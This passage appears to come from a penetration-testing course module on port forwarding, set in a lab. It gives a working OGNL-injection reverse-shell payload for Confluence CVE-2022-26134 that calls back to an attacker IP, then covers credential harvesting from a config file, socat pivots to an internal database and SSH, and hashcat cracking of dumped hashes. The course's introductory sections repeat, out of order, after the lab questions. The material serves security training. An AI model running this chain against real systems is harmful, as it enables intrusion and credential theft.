Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

